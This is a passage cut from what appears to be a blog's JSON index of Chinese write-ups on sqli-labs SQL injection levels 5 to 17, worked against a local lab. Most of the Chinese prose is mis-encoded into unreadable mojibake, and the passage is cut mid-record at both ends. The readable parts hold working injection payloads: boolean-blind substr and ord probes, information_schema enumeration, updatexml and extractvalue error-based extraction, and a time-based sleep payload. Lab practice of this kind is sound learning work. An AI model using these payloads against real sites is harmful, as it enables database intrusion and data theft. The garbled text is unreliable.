Left()å¾—åˆ°å­—ç¬¦ä¸²å·¦éƒ¨æŒ‡å®šä¸ªæ•°çš„å­—ç¬¦ Left ( string, n ) stringä¸ºè¦æˆªå–çš„å­—ç¬¦ä¸²ï¼Œnä¸ºé•¿åº¦ã€‚ Sqlç”¨ä¾‹ï¼š (1) left(database(),1)&gt;â€™aâ€™,æŸ¥çœ‹æ•°æ®åº“åç¬¬ä¸€ä½ï¼Œleft(database(),2)&gt;â€™abâ€™,æŸ¥çœ‹æ•°æ®åº“åå‰äºŒä½ã€‚ (2) åŒæ ·çš„stringå¯ä»¥ä¸ºè‡ªè¡Œæ„é€ çš„sqlè¯­å¥ã€‚ åŒæ—¶ä¹Ÿè¦ä»‹ç»ORD()å‡½æ•°ï¼Œæ­¤å‡½æ•°ä¸ºè¿”å›ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ASCIIç ï¼Œç»å¸¸ä¸ä¸Šé¢çš„å‡½æ•°è¿›è¡Œç»„åˆä½¿ç”¨ã€‚ ä¾‹å¦‚ORD(MID(DATABASE(),1,1))&gt;114 æ„ä¸ºæ£€æµ‹database()çš„ç¬¬ä¸€ä½ASCIIç æ˜¯å¦å¤§äº114ï¼Œä¹Ÿå³æ˜¯â€˜râ€™èµ„æ–™æ¥æºï¼šhttps://www.cnblogs.com/lcamry/p/5504374.html length()å‡½æ•°å¯ä»¥ç”¨æ¥åˆ¤æ–­å­—ç¬¦æ•°egï¼šlength(database())&gt;5,è¿™ä¸ªæ•°æ®åº“çš„åç§°æ˜¯å¦å¤§äºäº”ä¸ªå­—ç¬¦èµ„æ–™å…ˆæ”¾ç€å§ï¼Œæ„Ÿè§‰è¿˜æ˜¯è¦è¿ç”¨äº†è®°å¿†åŠ›ä¼šæ¯”è¾ƒæ·±ç„¶åå›åˆ°é¢˜ç›®æ¥ï¼šæ­¤æ—¶æˆ‘ä»¬ä½¿ç”¨lengthåˆ¤æ–­æ•°æ®åº“åç§°çš„é•¿çŸ­ä½¿ç”¨æŒ‡ä»¤and length(database())&gt;=8 ç”»é¢è¿”å› ä½†æ˜¯å½“æˆ‘ ä¸ºand length (database())&gt;9çš„æ—¶å€™ è¿”å›äº†è¿™ç©æ„ï¼Œè¯´æ˜æ˜¯é”™çš„ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªæ•°æ®åº“çš„å­—ç¬¦æ•°æ˜¯8ï¼Œæƒ³ä¸€ä¸‹æˆ‘å°±è§‰å¾—æ˜¯securityã€‚æˆ‘ä»¬æ¥ä¸‹æ¥å»è¯•è¯• æ–¹æ³•ä¸€substr((string, start&lt;,length&gt;) è¿™é‡Œæœ‰ä¸€ç§æ–¹æ³•æ˜¯åˆ©ç”¨ substr(database(),1,1)=â€™sâ€™ è¿™ä¸ªå‡½æ•°æ¥ä¸€ä¸ªä¸ªè¯• å‘ç°æ˜¯å¯ä»¥çš„ï¼Œè¯´æ˜ç¬¬ä¸€ä¸ªå­—æ¯å°±æ˜¯sï¼Œç„¶åæ¥ä¸‹æ¥ç»§ç»­å»è¯•ï¼Œå‘ç°å°±æ˜¯security æ–¹æ³•2è¿™é‡Œæœ‰ä¸€ç§æ–¹æ³•æ˜¯åˆ©ç”¨burp suiteå·¥å…·ï¼šä¸‹é¢æ˜¯å­¦ä¹ è¿‡ç¨‹ proxy å’Œä»£ç†ç›¸å…³ interceptæˆªæ–­é»˜è®¤Intercept is on æŒ‰é’®å‡ºäºå¼€å¯çŠ¶æ€ ä¹Ÿå°±æ˜¯è¯´é»˜è®¤ä»£ç†æˆªæ–­åŠŸèƒ½æ˜¯æ‰“å¼€çš„.æ­¤æ—¶æ‰€æœ‰çš„è¯·æ±‚éƒ½ä¼šè¢«æˆªæ–­,åªæœ‰æ‰‹åŠ¨Forwardä¹‹åè¯·æ±‚æ‰ä¼šè¢«å‘å‡ºå» Http history(httpè¯·æ±‚å†å²)æ‰€æœ‰ç»è¿‡burp suite çš„è¯·æ±‚ éƒ½ä¼šè¢«è®°å½•åˆ°http historyä¸­. ä¸Šé¢æ˜¯è¯·æ±‚æ¦‚è¦ä¿¡æ¯ ä¸‹é¢æ˜¯è¯·æ±‚è¯¦ç»†ä¿¡æ¯ websookets historyæœ‰çš„webæ—¶æ²¡æœ‰ç•Œé¢çš„ï¼Œæ˜¯ç”¨ä¸€ä¸ªé•¿é“¾æ¥ ç±»ä¼¼äºapiçš„æ–¹å¼æ¥ä¼ è¾“æ•°æ® burp suiteä¹Ÿæ˜¯å¯ä»¥æˆªè·è¿™ç±»ä¿¡æ¯çš„apiæ˜¯ä¸€ä¸ªé€šé“ï¼Œæ˜¯ä¸€ä¸ªæ¥å£ï¼Œè´Ÿè´£ä¸€ä¸ªç¨‹åºå’Œå…¶ä»–è½¯ä»¶çš„æ²Ÿé€šï¼Œæœ¬è´¨æ˜¯é¢„å…ˆå®šä¹‰çš„å‡½æ•°ï¼Œå°±æ˜¯ç±»ä¼¼äºé¢„è®¾ã€‚ optionsï¼ˆé…ç½®é€‰é¡¹ï¼‰Proxy Listeners(ä¾¦å¬ç«¯å£è®¾ç½®) ç‚¹å‡»next å°±ä¼šç”Ÿæˆä¸€å¼ è¯ä¹¦ é€‰æ‹©è·¯å¾„ä¿å­˜. ç„¶åå¯¼å…¥åˆ°æµè§ˆå™¨,å°±å¯ä»¥å®ç°httpsçš„è®¿é—® èµ„æ–™æ¥è‡ªï¼šhttps://www.cnblogs.com/php09/p/10412687.html å­¦ä¹ åšå®¢ï¼šhttps://blog.csdn.net/qq_35544379/article/details/76696106 å¼„è¿™ä¸ªå¼„å¾—æˆ‘æƒ³åï¼Œæˆ‘åœ¨æŠ“sqlilabsçš„æœ¬åœ°åŒ…çš„æ—¶å€™ï¼Œä¸€ç›´æŠ“ä¸åˆ° ï¼Œæˆ‘ä»¥ä¸ºæ˜¯burpçš„é—®é¢˜ï¼ŒåŸæ¥æ˜¯æµè§ˆå™¨çš„é—®é¢˜ï¼Œäººå‚»äº†ï¼Œæˆ‘è¯•äº†å‡ ä¸ªæ–¹æ³•ï¼Œå¥½åƒä¿®æ”¹ç«ç‹æµè§ˆå™¨çš„ä¸€ä¸ªé«˜çº§é€‰é¡¹æ˜¯æœ€æœ‰æ•ˆçš„ï¼Œè¿™æ ·ä½ ä½¿ç”¨localhostè¾“å…¥çš„æ—¶å€™ä¹Ÿå¯ä»¥æŠ“åˆ°äº† æˆ‘å‘ç°ä¸€ä»¶äº‹ï¼Œæˆ‘å†ç”¨ 1?id=1'and substr(database(),1,1)='s' --+ è¿™ä¸ªè¯­å¥çš„æ—¶å€™ï¼Œæˆ‘å°±åœ¨æƒ³ï¼Œæˆ‘é¦–å…ˆçŸ¥é“è¿™ä¸ªæ•°æ®åº“çš„åç§°æœ‰å¤šé•¿ï¼Œç„¶åå¯¹æ¯ä¸ªå­—æ¯å•ç‹¬åŠ ä¸€ä¸ªburpé‡Œé¢çš„å˜é‡ç¬¦ï¼Œè¿™æ ·ï¼Œæˆ‘æ˜¯ä¸æ˜¯å°±å…å»äº†ä¸€ä¸ªä¸ªå»è¯•çš„éº»çƒ¦å‘¢ï¼Ÿæ¥ä¸‹æ¥éªŒè¯ä¸€ä¸‹æ ¹æ®å‰é¢æˆ‘çš„åšé¢˜ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œè¿™ä¸ªæ•°æ®åº“åå­—çš„é•¿åº¦è‚¯å®šæ˜¯8ä¸ªå­—ç¬¦ é¦–å…ˆæ˜¯è¿™æ · ç„¶å å…ˆclear å†åˆ†åˆ«å¯¹æ¯ä¸ªaè¿›è¡Œadd æˆ‘å‘ç°è¿™ä¸ªæ–¹æ³•æ˜¯ä¸è¡Œçš„ï¼Œä½†æ˜¯æˆ‘çš„æ€è·¯æ˜¯OKçš„ï¼Œå› ä¸ºæˆ‘å‘ç°ä»–æœ‰å¦å¤–ä¸€ä¸ªåŠŸèƒ½ï¼Œæˆ‘æ¥ä¸‹æ¥ç›´æ¥æ”¾å›¾å°±ä¸€ç›®äº†ç„¶äº† å°±è¿™æ ·ï¼Œç„¶åç‚¹å‡»star attackå°±å¯ä»¥ï¼Œä½†æ˜¯æˆ‘å‘ç°è¿™ä¸ªadd from listä¸­é€‰æ‹©8ä¸ªå­—æ¯å¥½åƒæ²¡æœ‰æ‰€æœ‰æ’åºï¼Œæ‰€ä»¥ã€‚ã€‚ã€‚ã€‚ã€‚å¯èƒ½è¿˜æœ‰æ›´å¥½åœ°æ–¹æ³•ï¼Ÿï¼Œé‚£åæ­£è¿™ä¸€æ­¥å¤§æ¦‚å°±æ˜¯è¿™æ ·äº†æ¥ä¸‹æ¥æ˜¯åˆ¤æ–­ä»–çš„åº“åï¼šåº“åå…¶å®è¿˜æ˜¯è¦ä½¿ç”¨substræ¥åˆ¤æ–­ä»–çš„åº“å å…¶å®å°±æ˜¯åœ¨å‰ä¸‰å…³æŸ¥è¯¢çš„åŸºç¡€ä¸Š åŠ äº†ä¸€ä¸ªsubstr è¯­å¥æ˜¯è¿™æ ·çš„ 1' and substr((select table_name from information_schema.tables where table_schema='security'limit 0,1 ),1,1) = 'e' --+ //è¿™è¾¹æœ‰ä¸€ç‚¹éœ€è¦è¯´æ˜çš„æ˜¯ä¸ºä»€ä¹ˆéœ€è¦åŠ è¿™ä¸ªlimit 0,1 æˆ‘ä»¬çŸ¥é“ä¸€ä¸ªåº“ä¸­å¯ä»¥æœ‰å¾ˆå¤šè¡¨ï¼ŒæŒ‰æˆ‘çš„ç†è§£æ˜¯ï¼Œä½ å¦‚æœæ²¡æœ‰åŠ è¿™ä¸ªlimit0,1 é‚£ä¹ˆæ•°æ®åº“ä»¥ä¸ºä½ è¦æŸ¥è¯¢çš„æ•°æ®æ•°æ¯ä¸ªè¡¨çš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªè¯­å¥å˜æˆï¼Œæ¯ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—æ¯æ˜¯eï¼Œè€Œä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œç¬¬ä¸€ä¸ªè¡¨çš„é¦–å­—æ¯ä¸ºeã€‚ è¿™è¾¹è¡¥å……ä¸€ä¸‹limit n,mçš„åŠŸèƒ½å’Œæ„æ€limitçš„ä½¿ç”¨æ ¼å¼ä¸ºlimit m,nï¼Œå…¶ä¸­mæ˜¯æŒ‡è®°å½•å¼€å§‹çš„ä½ç½®ï¼Œä»0å¼€å§‹ï¼Œè¡¨ç¤ºç¬¬ä¸€æ¡è®°å½•ï¼Œnæ˜¯æŒ‡å–næ¡è®°å½•ä¾‹å¦‚ï¼šlimit 0,1 è¡¨ç¤ºä»ç¬¬ä¸€æ¡è®°å½•å¼€å§‹ï¼Œå–ä¸€æ¡è®°å½•ï¼Œåœ¨ä¸Šé¢é‚£ä¸ªè¯­å¥ä¸­çš„æ„æ€å°±æ˜¯ï¼Œä»ç¬¬ä¸€ä¸ªè¡¨å¼€å§‹å–ï¼Œå»ä¸€ä¸ªè¡¨çš„åç§° localhost:81/sqli-labs-php7-master/Less-5/?id=1â€™ and substr((select table_name from information_schema.tables where table_schema=â€™securityâ€™ limit 0,1),1,1)=â€™eâ€™ â€“+ç„¶åæ ¹æ®ä¹‹å‰çš„ç»éªŒå°±æ˜¯emails å…¶å®ä¹Ÿæ²¡å•¥å¤ªå¤§åŒºåˆ«ï¼Œåç»­å°±æ˜¯æ›¿æ¢substrå½“ä¸­çš„è¯­å¥ï¼Œæ›¿æ¢ä¸ºselect column_name from information_schema.columns where table_name =â€™emailsâ€™ è¿˜æœ‰ä»€ä¹ˆä¸€ä¸ªå­—ç¬¦çš„å°±ä¸å¤šè¯´äº†ã€‚å…¶å®ä¸ä¸€å®šè¦ç”¨substr è¿˜æœ‰å…¶ä»–å¾ˆå¤šå‘½ä»¤ï¼Œæˆ‘åœ¨ä¸‹é¢çš„å…³å¡çœ‹çœ‹èƒ½ä¸èƒ½ä½¿ç”¨ï¼Œä¸èƒ½ä½¿ç”¨çš„è¯ï¼Œåç»­å†æ•´ç† ç¬¬å…­å…³ç¡®å®å’Œä¹‹å‰ä¸€æ ·ï¼Œä½†æ˜¯è¿™è¾¹æ˜¯åŒå¼•å·çš„æŠ¥é”™è§£é¢˜æ€è·¯å’Œä¸Šä¸€æ¬¡ä¸€æ ·ï¼Œè¿™æ¬¡æˆ‘ä»¬æ¢æ¢å…¶ä»–æŒ‡ä»¤çœ‹çœ‹æ•ˆæœï¼šæˆ‘å»æŸ¥äº†ä¸€ä¸‹ æŠ¥é”™å‡½æ•°æ˜¯å¦éƒ½éœ€è¦åŠ and æˆ‘æ˜¯æ²¡æ‰¾åˆ°å…·ä½“è¯´æ˜ï¼Œä½†æˆ‘çœ‹æ¯ä¸ªåœ¨ä½¿ç”¨çš„æ—¶å€™éƒ½æœ‰åŠ ä¸€ä¸ªandçš„æ¥ä¸‹æ¥æˆ‘ä»¬å…ˆç”¨leftå…¶å®å’Œsubsträ¹Ÿå·®ä¸å¤šï¼Œä¸è¿‡ leftæ˜¯è§„å®šä»å·¦è¾¹èµ·ï¼Œè€Œsubstrè¿˜èƒ½è§„å®šä»å“ªé‡Œå¼€å§‹ä»å“ªé‡Œç»“æŸè®°ä»£ç ä¸€æ ·æ‰“ä¸€ä¸‹","link":"/2020/11/09/sqlilabs2/"},{"title":"sqlilabs4","text":"ç¬¬åä¸€å…³è¿™é‡Œå¼€å§‹è¿›å…¥postæ³¨å…¥ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“ï¼Œpostæ˜¯å‘æœåŠ¡å™¨æäº¤æ•°æ® ä¸€å¼€å§‹æ˜¯ä»éœ€è¦ä»è¿™é‡Œè¾“å…¥è´¦å·å¯†ç åšå®Œä¹‹å‰çš„é¢˜ç›® å…¶å®å°±æœ‰æ„Ÿè§‰å°±æ˜¯ï¼Œä½ è¾“å…¥çš„ä¸œè¥¿ã€æ¯”å¦‚idã€passwordä¹‹ç±»çš„ æœ€åéƒ½ä¼šè½¬æ¢æˆsqlè¯­è¨€å¹¶å‘æŒ¥ä½œç”¨ï¼Œåœ¨ç¬¬ä¸€å…³ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†å•å¼•å·ï¼Œå¹¶ä¸”æˆªå›¾è¿›è¡Œåˆ†æï¼Œè€Œåœ¨è¿™ä¸€å…³æˆ‘ä»¬ä¹Ÿæ˜¯å¦‚æ­¤ åœ¨è¿™ä¸ªå½“ä¸­ï¼Œæˆ‘çœ‹å‡º æˆ‘ä»¬çš„è¯­å¥å¥½åƒå¯ä»¥è·Ÿä¹‹å‰ä¸€æ ·ï¼Œåœ¨1åé¢çš„''è¿™ä¸¤ä¸ªå¼•å·é‡Œé¢ä¼¼ä¹å¯ä»¥æ³¨å…¥æˆ‘ä»¬æƒ³è¦çš„å‘½ä»¤ä½†å…¶å®ä¸è¡Œ è¾“å‡ºçš„ç¡®å®è¿™æ ·ä¸€ä¸ªè¯­å¥ï¼Œè¿™ä¸ªæ—¶å€™å°±å¾ˆå¥‡æ€ªäº†ï¼Œä¸ºä»€ä¹ˆå•å¼•å·é‡Œé¢çš„å†…å®¹ä¸ä¼šè¢«æ‰§è¡Œå‘¢ï¼Ÿ æˆ‘ä»¬å†æ¥å¯¹æ¯”ä¸€ä¸‹ä»–å’Œç¬¬ä¸€å…³çš„æºç  æˆ‘åäº†å•Š å…¶å®æœ‰ä¸ªå¾ˆå…³é”®çš„ç‚¹æ˜¯ï¼Œç°åœ¨æˆ‘ä»¬åœ¨è¿™é‡Œè¾“å…¥ â€“+æ³¨é‡ŠåŠŸèƒ½ï¼Œå…¶å®å·²ç»æ˜¯ä¸èµ·ä½œç”¨çš„äº†æ‰€ä»¥ä¸Šé¢ä¸ºä»€ä¹ˆä¸ä¼šæ‰§è¡Œå°±æ˜¯å› ä¸ºè¿™ä¸ªè¿™ä¸ªåŸå›  ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åªéœ€è¦è¾“å…¥â€“(ç©ºæ ¼), æˆ–è€…# å³å¯æ³¨é‡Šæ‰åé¢çš„è¯­å¥ è¿™æ ·å°±å¯ä»¥äº† æˆ‘çš„å¤©å“ªï¼Œæˆ‘å¯¹è‡ªå·±å¤ªæ— è¯­äº† è¿™é‡Œæ•´ç†ä¸€ä¸‹æ³¨é‡Šçš„çŸ¥è¯†ç‚¹æ³¨é‡Šæ‰‹æ®µ1mysqlçš„æ³¨é‡Šæœ‰4 ç§ ï¼š â€œ#â€ ï¼š # å¼€å¤´åˆ°è¡Œå°¾çš„éƒ½ä¸ºæ³¨é‡Šï¼Œåªèƒ½æ³¨é‡Šä¸€è¡Œ â€œâ€“ â€ ï¼ˆ2ä¸ªå‡å· ä¸€ä¸ªç©ºæ ¼ï¼‰ ï¼š â€“ å¼€å¤´åˆ°è¡Œå°¾éƒ½ä¸ºæ³¨é‡Š ï¼Œ åªèƒ½æ³¨é‡Šä¸€è¡Œ â€œ/* xxx /â€œ : å¯ä»¥æ³¨é‡Šå¤šè¡Œï¼Œä½†æ˜¯ä¸€å®šè¦é—­åˆï¼Œä¸ç„¶å‡ºé”™ â€/! æ•°å­— ä»£ç  */â€œ : å¯ä»¥è·¨è¡Œæ³¨é‡Šï¼Œä½†æ˜¯ä¸€å®šè¦é—­åˆï¼Œä¸ç„¶å‡ºé”™ã€‚2åœ¨æµè§ˆå™¨urlä¸­ï¼Œ#æ˜¯ç”¨æ¥çŸ¥é“æµè§ˆå™¨åŠ¨ä½œï¼ˆä¾‹å¦‚é”šç‚¹ï¼‰ï¼Œå¯¹æœåŠ¡å™¨ç«¯æ²¡æœ‰æ•ˆæœã€‚å¯ä»¥ç”¨ # çš„urlç¼–ç  å³%23ä»£æ›¿ã€‚åœ¨æµè§ˆå™¨ä¸­ï¼Œurlä¸­çš„+è§£æä¸ºç©ºæ ¼ã€‚åœ¨myslqä¸­ï¼Œâ€“â€™ æ˜¯çš„ â€“ ä¸ å•å¼•å· è¿æ¥åœ¨ä¸€èµ·ï¼Œä¸èƒ½å½¢æˆæ­£ç¡®çš„sqlè¯­å¥ï¼Œè€Œ â€“ç©ºæ ¼ åˆ™å¯ä»¥ã€‚æ‰€ä»¥åœ¨æµè§ˆå™¨çš„urlä¸­ç”¨ â€“+ æˆ–â€“â€™ä½¿æœåŠ¡ç«¯èƒ½å¤Ÿæ­£ç¡®æ³¨é‡Šsqlè¯­å¥æ‰€ä»¥ +é’ˆå¯¹çš„æ˜¯åœ¨urlä¸­çš„æ³¨é‡Šï¼ï¼ï¼ è€è§„çŸ© order by æŸ¥å­—æ®µæ•° å­—æ®µæ•°æ˜¯2 æ‰€ä»¥ æ¥ä¸‹çš„æ“ä½œå°±å¾ˆæ˜ç¡®äº† æ¥ä¸‹æ¥å°±æ˜¯å·©å›ºä¸€ä¸‹ä»£ç çš„è®°å¿†äº† æ¥ä¸‹æ¥æ˜¯ç¬¬12å…³ç¬¬åäºŒå…³ æˆ‘ä»¬ æ— è®ºè¾“å…¥å•å¼•å·è¿˜æ˜¯æ‹¬å·éƒ½æ— ååº”ï¼Œéƒ½æ²¡æœ‰æŠ¥é”™ï¼Œæ‰€ä»¥æˆ‘ç›´æ¥è¾“å…¥äº†åŒå¼•å·ï¼Œå‡ºç°è¿™ä¸ªæŠ¥é”™ï¼Œæ‰€ä»¥å¾ˆæ˜æ˜¾ æˆ‘ä»¬éœ€è¦åŒå¼•å·åŠ æ‹¬å·æ¥é—­åˆåé¢è¯­å¥ï¼Œå¹¶åœ¨å…¶ä¸­æ³¨å…¥æˆ‘ä»¬çš„æŸ¥è¯¢è¯­å¥ ç¬¬åä¸‰å…³è¿™ä¸ªå…³å¡å…¶å®å°±æ˜¯éœ€è¦ç›²æ³¨äº†ï¼Œå› ä¸ºç™»å½•æˆåŠŸä»¥åï¼Œä»–æ˜¯æ²¡æœ‰ç™»å½•ä¿¡æ¯çš„ æ¥ä¸‹æ¥å°±æ˜¯å…ˆå¸ƒå°”ç›²æ³¨ é‚£å°±æ˜¯çœ‹æœ‰æ— æŠ¥é”™è¿™é‡Œæˆ‘åœ¨ä½¿ç”¨burp suitæš´åŠ›ç ´è§£è¯•è¯•å‘ç°é‚£ä¸ªå¯†ç å­—å…¸é‡Œé¢æ²¡æœ‰emailsè¿™ä¸ªåå­—ï¼Œæ‰€ä»¥å°±æ²¡æˆåŠŸï¼Œæˆ‘è§‰å¾—å¯ä»¥å»æ‰¾ä¸€äº›å­—å…¸è¿‡æ¥ã€‚ ç„¶åè¿™é‡Œå¼•å…¥ä¸€ä¸ªæ–°å‡½æ•°updatexml:ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ ï¼Œæˆ‘ä»¬åœ¨æ³¨å…¥ä¸­ä½¿ç”¨è¿™ä¸ªè¯­å¥æ˜¯åŠ äº†selectçš„ï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰å¯¹çœŸæ­£çš„æ•°æ®è¿›è¡Œä¿®æ”¹ï¼Œè€Œæ˜¯åœ¨å†…å­˜ä¸­å°†å–å‡ºçš„æ•°æ®è¿›è¡Œä¿®æ”¹ç„¶åè¿”å›ç»™ç”¨æˆ·æ³¨æ„ï¼šè¿™ä¸ªè¿™ä¸ªå‡½æ•°æ˜¯é’ˆå¯¹xmlæ–‡ä»¶è¿›è¡Œä¿®æ”¹çš„ï¼Œç„¶åæˆ‘ä»¬æ•°æ®åº“çš„å†…å®¹åŸºæœ¬ä¸Šæ˜¯å­˜æ”¾åœ¨è¿™ä¸ªxmlæ–‡ä»¶ä¸­çš„è¯­æ³•ï¼šupdatexml(xml_document,xpath_string,new_value)ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDocç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²)ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ® å®ä¾‹select updatexml(1,concat(â€˜â€˜,(SELECT database()),â€™â€˜),1) â€“ ç»“æœæ˜¯çœ‹æŠ¥é”™ æ˜¯XPATHæŠ¥é”™ï¼Œå¹¶ä¸” è¾“å‡ºçš„æŠ¥é”™ä¿¡æ¯ï¼Œæ˜¯æˆ‘ä»¬é‚£ä¸ªconcatæ‹¼æ¥éƒ¨åˆ†çš„å†…å®¹ã€‚ ä½¿ç”¨ç†è§£ï¼šå¯¹äºè¿™ä¸ªå‡½æ•°ï¼Œæˆ‘æƒ³äº†ä¸€ä¸‹ï¼Œå¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼Œupdatexmlæ˜¯ä¸€ä¸ªä¿®æ”¹å‡½æ•°ï¼Œä»–çš„è¯­æ³•æ˜¯UPDATEXML (XML_document, XPath_string, new_value); æˆ‘ä»¬çŸ¥é“ä¸­é—´é‚£ä¸ªXPath_stringæ˜¯éœ€è¦ç¬¦åˆxpathæ ¼å¼çš„ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬æ³¨å…¥çš„æ ¼å¼ä¸ç¬¦åˆxpathä»–å°±ä¼šæŠ¥é”™ï¼Œè€Œupdatexmlï¼ˆï¼‰æŠ¥é”™ä¿¡æ¯æ˜¯ç‰¹æ®Šå­—ç¬¦ã€å­—æ¯ä»¥åŠä¹‹åçš„å†…å®¹ï¼Œä¸ºäº†å‰é¢åé¢å­—æ¯ä¸¢å¤±ï¼Œå¼€å¤´ç»“å°¾è¿æ¥ç‰¹æ®Šå­—ç¬¦~ï¼Œ è¿™æ ·å°±åªæœ‰ä¸­é—´æˆ‘ä»¬çš„æŸ¥è¯¢è¯­å¥æ˜¯ä»¥ç»“æœçš„å½¢å¼æŠ¥å‡ºï¼Œè€Œä¸”æŠ¥é”™çš„å†…å®¹æ˜¯å°†æˆ‘ä»¬çš„è¯­å¥è½¬åŒ–è¿‡åçš„åé¢æˆ‘åˆå°†â€˜â€™é‡Œé¢çš„å†…å®¹æ›¿æ¢äº†ä¸€ä¸‹ï¼Œéƒ½æ˜¯ä¼šåŸæ ·è¾“å‡ºçš„ï¼Œä½†æ˜¯å¦‚æœæ˜¯å­—æ¯ åˆ™ä¼šè¡¨ç°æ— é”™ï¼Œè¯´æ˜è¿™ä¸ªæ˜¯åˆæ³•çš„ï¼Œé‚£ä¸‹æ¬¡åœ¨ä½¿ç”¨è¿™ä¸ªè¯­å¥æ³¨å…¥çš„æ—¶å€™å¹²è„†éƒ½ç”¨å­—ç¬¦å§ï¼Œ ç¬¬åå››å…³æˆ‘ä»¬å°±ä½¿ç”¨extractvalueï¼ˆï¼‰è¿™ä¸ªå‡½æ•°è¯•è¯•ä½œç”¨ï¼šå¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢çš„å‡½æ•°æ ¼å¼extractvalue(xml.frag,xpath_expr)å…±åŒç‚¹å’Œupdatexmlçš„å…±åŒç‚¹æ˜¯æŠ¥é”™åŸç†ï¼šXpathæ ¼å¼è¯­æ³•ä¹¦å†™é”™è¯¯çš„è¯ï¼Œå°±ä¼šæŠ¥é”™å¹¶ä¸”æŠ¥é”™çš„å†…å®¹ä¹Ÿæ˜¯å¼•å·å†…çš„ï¼Œå¦‚æœæ˜¯å‘½ä»¤åˆ™ä¼šç›´æ¥è½¬åŒ–ç›´æ¥ä¸Šæ“ä½œï¼š ä½¿ç”¨ extractvalue(1,concat(â€˜â€˜,(select database()),â€™â€˜)) â€“ æ¥ä¸‹æ¥å°±å¤§åŒå°å¼‚äº†ã€‚ å°ç»“ï¼šå…¶å®æˆ‘ä»¬ä½¿ç”¨çš„è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œéƒ½æ˜¯åˆ©ç”¨ä»–çš„æŠ¥é”™ä¼šå°†æˆ‘ä»¬çš„å‘½ä»¤è¯­å¥è¯†åˆ«ï¼Œå¹¶è¾“å‡ºæˆ‘ä»¬éœ€è¦çš„ä¿¡æ¯ã€‚ ç¬¬15å…³è¿™ä¸€å…³æ²¡æœ‰è¾“å‡ºæŠ¥é”™ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬è¾“å…¥ â€˜and1=1 â€“ å’Œâ€™and1=2 â€“ å‘ç°ç»“æœå…¶å®æ˜¯ä¸ä¸€æ ·çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥çŸ¥é“å•å¼•å·æ³¨å…¥ã€‚æ²¡æœ‰æŠ¥é”™ä¿¡æ¯ï¼Œæ„å‘³ç€æˆ‘ä»¬éœ€è¦æ—¶é—´ç›²æ³¨ï¼šadminâ€™ and if(substr(database(),1,1)=â€™sâ€™,sleep(5),1) â€“ å’Œä¹‹å‰çš„ä¹Ÿæ²¡å¤šå¤§åŒºåˆ«å“ˆå“ˆ ç¬¬åå…­å…³æ˜¯åŒå¼•å·åŠ æ‹¬å·çš„ å°ç»“ä¸€ä¸‹ï¼šåˆ°ç°åœ¨ä¸ºæ­¢é‡åˆ°çš„æ³¨å…¥ç‚¹å¥½åƒå°±æ˜¯åªæœ‰or 1=1â€“+ 1.â€™and 1=1â€“+ 2.â€and 1=1â€“+ 3.)and 1=1â€“+ 4.â€™)and 1=1â€“+ 5.â€) and 1=1â€“+ 6.â€))and 1=1â€“+ å…³äºé—­åˆé—®é¢˜çš„é“¾æ¥https://blog.csdn.net/qq_36896220/article/details/94129125 è¡¥å……çŸ¥è¯†ï¼šåœ¨çœ‹æºç çš„æ—¶å€™æ³¨æ„åˆ°æœ‰ä¸€ä¸ªisset()å‡½æ•°ä½œç”¨ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦å·²è®¾ç½®å¹¶ä¸”éNULL","link":"/2020/11/19/sqlilabs4/"},{"title":"sqlilabs5","text":"ç¬¬åä¸ƒå…³è¿™ä¸€å…³å’Œå…¶ä»–çš„å°±ä¸å¤ªä¸€æ ·ï¼Œæ¯”å¦‚è¯´æ ‡é¢˜æ˜¯update queryæ‰€ä»¥è¿™é‡Œ æˆ‘ä»¬éœ€è¦ä¿®æ”¹è¡¨ä¸­çš„æ•°æ®ä¿®æ”¹è¡¨ä¸­æ•°æ®æˆ‘ä»¬ä½¿ç”¨çš„æ˜¯ updateè¯­æ³•æ˜¯ï¼šupdate test set sex=female;//æ‰€æœ‰å‘˜å·¥æ€§åˆ«æ›´æ”¹ä¸ºå¥³æ€§update test set sex = female where name =â€™zhangsanâ€™;//æ›´æ”¹å¼ ä¸‰è¿™ä¸ªå‘˜å·¥çš„æ€§åˆ« çœ‹äº†ä¸‹è¿™é¢˜çš„æ˜¯è¿™æ ·çš„ å½“æˆ‘åœ¨usernameé‡Œé¢éšä¾¿è¾“äº†admin ä»–å°±è¯´æˆ‘æˆåŠŸçš„æ›´æ”¹äº†æˆ‘çš„å¯†ç ï¼Œå†ç»“åˆæºç ï¼ŒçŒœæµ‹è¿™é‡Œæ˜¯ åœ¨æˆ‘è¾“å…¥è´¦å·ä»¥åï¼Œä»–ä¼šè¿æ¥åˆ°å­˜æ”¾æˆ‘è¿™ä¸ªè´¦å·çš„å­—ç¬¦æ®µï¼Œç„¶åå°†é‚£è¾¹çš„å¯†ç æ›´æ¢æˆæˆ‘ç°åœ¨è¾“çš„ ç„¶åï¼Œåœ¨usernameæ— 